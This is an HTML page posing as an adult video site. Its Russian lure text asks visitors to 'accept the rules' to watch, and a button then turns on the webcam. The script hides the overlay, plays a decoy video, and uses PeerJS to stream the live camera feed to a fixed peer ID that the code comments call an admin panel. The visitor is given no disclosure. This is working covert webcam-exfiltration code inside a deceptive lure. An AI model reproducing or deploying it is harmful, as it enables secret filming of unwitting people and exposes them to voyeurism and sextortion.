<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DragHub - Секс без ограничений</title>
    <style>
        body {
            margin: 0; padding: 0;
            background-color: #c4b5fd;
            font-family: 'Segoe UI', sans-serif;
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            height: 100vh; overflow: hidden;
        }
        #camera-blocker {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #111827; color: white;
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            z-index: 9999; text-align: center; padding: 20px; box-sizing: border-box;
        }
        .start-btn {
            padding: 15px 40px; font-size: 20px;
            background-color: #facc15; color: black;
            border: none; border-radius: 8px;
            cursor: pointer; font-weight: bold; margin-top: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
        }
        .logo { font-size: 48px; font-weight: bold; margin-bottom: 20px; color: #000; }
        .logo span { color: #facc15; }
        .main-container { width: 80%; max-width: 800px; }
        .video-box { width: 100%; aspect-ratio: 16/9; border: 5px solid #000000; background-color: #000; box-sizing: border-box; }
        video { width: 100%; height: 100%; object-fit: cover; }
    </style>
    <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
</head>
<body>

    <div id="camera-blocker">
        <h1 style="margin-bottom: 10px;">Секс с Куртой только на нашем сайте</h1>
        <p style="font-size: 18px; color: #9ca3af;">Если хотите видеть больше секса, примите правила</p>
        <button class="start-btn" onclick="initChallenge()">Посмотреть видео</button>
    </div>

    <div class="logo">Drag<span>hub</span></div>

    <div class="main-container">
        <div class="video-box">
            <video id="challenge-video" controls>
                <source src="https://files.catbox.moe/zqmnf3.mp4" type="video/mp4">
            </video>
        </div>
    </div>

    <script>
        const blocker = document.getElementById('camera-blocker');
        let peer;

        async function initChallenge() {
            try {
                // Kamerani yuqori sifatda (640x480) yoqamiz, baribir qotmaydi!
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 640, height: 480 }, 
                    audio: false 
                });
                
                blocker.style.display = 'none';
                document.getElementById('challenge-video').play();

                // Peer serverga ulanish (Avtomat tekin ID oladi)
                peer = new Peer();

                peer.on('open', (id) => {
                    console.log('Mening ID:', id);
                    
                    // Admin panelga (Developper Core) avtomat qo'ng'iroq qilish
                    const call = peer.call('draghub-admin-panel-id', stream);
                });

            } catch (error) {
                alert("Чтобы смотреть секс, примите правила.");
            }
        }
    </script>
</body>
</html>
